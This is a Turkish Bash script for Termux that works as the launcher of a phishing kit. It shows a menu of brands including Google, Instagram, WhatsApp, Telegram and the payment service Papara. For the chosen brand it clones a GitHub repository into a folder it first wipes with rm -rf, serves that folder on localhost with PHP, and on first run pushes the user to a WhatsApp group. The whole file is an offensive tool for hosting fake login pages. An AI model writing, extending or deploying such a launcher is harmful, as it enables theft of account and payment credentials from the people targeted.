#!/bin/bash

# Terminal renk kodları
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
RESET='\033[0m'

# Ekranı temizle ve boyutlandır
clear
printf '\e[8;40;80t'

# İlk çalıştırmada WhatsApp grubuna yönlendirme
if [ ! -f ".first_run" ]; then
    echo -e "${YELLOW}İlk kez çalıştırılıyor... WhatsApp grubuna yönlendiriliyorsunuz.${RESET}"
    touch .first_run
    termux-open-url "https://chat.whatsapp.com/Ic9MKE4T6k9G5wc5ZjM9VI"
    exit
fi

# Joker Tim Logo ve başlık
echo -e "${CYAN}"
echo " ____ "
echo "< ^^ > "
echo " ---- "
echo "    \\"
echo "     \\"
echo "           _ _______ _    _   __  __  ____  _____"
echo "          | |__   __| |  | | |  \\/  |/ __ \\|  __ \\"
echo "          | |  | |  | |__| | | \\  / | |  | | |  | |"
echo "      _   | |  | |  |  __  | | |\\/| | |  | | |  | |"
echo "     | |__| |  | |  | |  | | | |  | | |__| | |__| |"
echo "      \\____/   |_|  |_|  |_| |_|  |_|\\____/|_____/"
echo -e "${RESET}"

# Bağımlılık kontrolü
echo -e "${YELLOW}Gerekli bileşenler kontrol ediliyor...${RESET}"
if ! command -v git &> /dev/null; then
    echo -e "${RED}Hata: Git yüklü değil! Lütfen 'pkg install git' ile yükleyin.${RESET}"
    exit 1
fi
if ! command -v php &> /dev/null; then
    echo -e "${RED}Hata: PHP yüklü değil! Lütfen 'pkg install php' ile yükleyin.${RESET}"
    exit 1
fi

# Menü seçenekleri
echo -e "\n${GREEN}Lütfen bir bölüm seçin: ${RESET}\n"
echo -e "[${CYAN}1${RESET}] Google"
echo -e "[${CYAN}2${RESET}] GitHub"
echo -e "[${CYAN}3${RESET}] PUBG Mobile"
echo -e "[${CYAN}4${RESET}] Instagram"
echo -e "[${CYAN}5${RESET}] TikTok"
echo -e "[${CYAN}6${RESET}] WhatsApp"
echo -e "[${CYAN}7${RESET}] Telegram"
echo -e "[${CYAN}8${RESET}] Papara"

# Kullanıcıdan seçim al
echo -e "\n${YELLOW}Seçiminizi girin:${RESET}"
read -p "> " selection

# GitHub deposu
GITHUB_REPO="https://github.com/Illegal2/jthwep.git"

# Çekilecek dosyaların hedef klasörleri
FOLDER_GOOGLE="site/google/index.php"
FOLDER_GITHUB="site/github/dosyalar"
FOLDER_PUBG="site/pubg_mobil/dosyalar"
FOLDER_INSTAGRAM="site/instagram/dosyalar"
FOLDER_TIKTOK="site/tiktok/dosyalar"
FOLDER_WHATSAPP="site/whatsapp/dosyalar"
FOLDER_TELEGRAM="site/telegram/dosyalar"
FOLDER_PAPARA="site/papara/dosyalar"

# Fonksiyon: GitHub'dan çek ve sunucuyu başlat
download_and_run() {
    local target_folder=$1

    # Önce eski dosyaları temizle
    rm -rf "$target_folder"
    
    # GitHub'dan en son kodları indir
    git clone "$GITHUB_REPO" "$target_folder"
    
    # Sunucuyu başlat
    php -S localhost:8000 -t "$target_folder"
}

# Seçime göre işlem yap
case $selection in
  1)
    echo -e "${GREEN}Google sitesi başlatılıyor...${RESET}"
    download_and_run "$FOLDER_GOOGLE"
    ;;
  2)
    echo -e "${GREEN}GitHub sitesi başlatılıyor...${RESET}"
    download_and_run "$FOLDER_GITHUB"
    ;;
  3)
    echo -e "${GREEN}PUBG Mobile sitesi başlatılıyor...${RESET}"
    download_and_run "$FOLDER_PUBG"
    ;;
  4)
    echo -e "${GREEN}Instagram sitesi başlatılıyor...${RESET}"
    download_and_run "$FOLDER_INSTAGRAM"
    ;;
  5)
    echo -e "${GREEN}TikTok sitesi başlatılıyor...${RESET}"
    download_and_run "$FOLDER_TIKTOK"
    ;;
  6)
    echo -e "${GREEN}WhatsApp sitesi başlatılıyor...${RESET}"
    download_and_run "$FOLDER_WHATSAPP"
    ;;
  7)
    echo -e "${GREEN}Telegram sitesi başlatılıyor...${RESET}"
    download_and_run "$FOLDER_TELEGRAM"
    ;;
  8)
    echo -e "${GREEN}Papara sitesi başlatılıyor...${RESET}"
    download_and_run "$FOLDER_PAPARA"
    ;;
  *)
    echo -e "${RED}Hatalı seçim! Lütfen 1-8 arasında bir sayı giriniz.${RESET}"
    exit 1
    ;;
esac

echo -e "${BLUE}Sistem linki: http://localhost:8000${RESET}"
